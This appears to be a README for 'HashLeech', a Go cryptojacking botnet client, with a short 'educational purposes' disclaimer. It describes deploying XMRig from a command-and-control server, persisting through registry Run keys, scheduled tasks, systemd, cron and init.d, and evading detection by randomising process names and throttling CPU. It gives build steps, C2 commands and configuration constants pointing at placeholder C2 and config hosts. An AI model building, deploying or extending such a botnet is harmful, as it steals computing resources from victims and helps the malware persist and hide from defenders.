HashLeech - Cryptocurrency Mining Botnet
Disclaimer: This project is for educational and research purposes only. Unauthorized cryptocurrency mining on systems you don't own is illegal and unethical. Use this code only on systems you have explicit permission to test on.

Overview
HashLeech is a cryptocurrency mining botnet implementation that demonstrates how malware can distribute and manage cryptocurrency miners across multiple systems. Unlike traditional botnets focused on DDoS attacks, HashLeech specializes in Monero (XMR) mining using the XMRig miner.

Features
|---------------------------------------------------------------------------|
|Automatic Miner Deployment: Downloads and installs XMRig miner automatically|
|Command & Control (C2) Server: Centralized control of all mining nodes|
|Stealth Operation: Runs with minimal resource usage detection|
|Cross-Platform: Supports both Windows and Linux systems|
|Persistence Mechanisms: Automatically reinstalls after reboots|
|Dynamic Configuration: Remote updates of mining pool and settings|
|Heartbeat Monitoring: Regular status reports to C2 server|
|Resource Optimization: Adjusts mining intensity based on system specs|

graph mermaid
`
    BotClient[Bot Client (this repository)]
    C2Server[C2 Server (separate repository)]
    XMRig[XMRig Miner]

    BotClient -->|Connects to| C2Server
    BotClient -->|Downloads and runs| XMRig
    BotClient -->|Reports mining statistics| C2Server
    BotClient -->|Implements persistence| BotClient

    C2Server -->|Manages all connected bots| BotClient
    C2Server -->|Sends mining commands| XMRig
    C2Server -->|Collects statistics| BotClient
    C2Server -->|Updates mining configuration| XMRig

    XMRig -->|Official XMRig miner| XMRig
    XMRig -->|Configured for Monero mining| XMRig
`

Installation
For Research/Testing Purposes
Clone the repository:

bash
git clone https://github.com/yourusername/HashLeech.git
cd HashLeech
Configure the C2 server address in bot.go:

go
const C2Address = "your.c2.server.com:7003"
Build the bot:

bash
go build -o HashLeech
Run the bot:

bash
./HashLeech
Command Reference
Command	Description	Example
START	Start mining operation	START
STOP	Stop mining operation	STOP
UPDATE	Update miner binary	UPDATE
KILL	Remove miner and bot	KILL
PERSIST	Install persistence mechanism	PERSIST
Configuration
Edit the following constants in bot.go before building:

go
const (
    C2Address         = "your.c2.server.com:7003"  // Your C2 server address
    xmrigURL          = "https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-msvc-win64.zip"
    configURL         = "http://yourconfigserver.com/config.json" 
    minerPath         = "C:\\Windows\\Temp\\xmrig.exe"           // Windows path
    // minerPath      = "/tmp/xmrig"                            // Linux path
)
Mining Configuration
The config.json file should contain standard XMRig configuration. Example:

json
{
    "autosave": true,
    "cpu": true,
    "opencl": false,
    "cuda": false,
    "pools": [
        {
            "url": "pool.moneroocean.stream:10128",
            "user": "your_wallet_address",
            "pass": "x",
            "keepalive": true,
            "tls": false
        }
    ]
}
Persistence Mechanisms
HashLeech implements multiple persistence methods:

Windows:

Registry Run key

Scheduled tasks

Linux:

Systemd service

Cron job

Init.d script

Detection Avoidance
Randomizes process names

Uses standard TLS for C2 communication

Limits CPU usage to avoid detection

Runs with low process priority

Hides in system temp directories
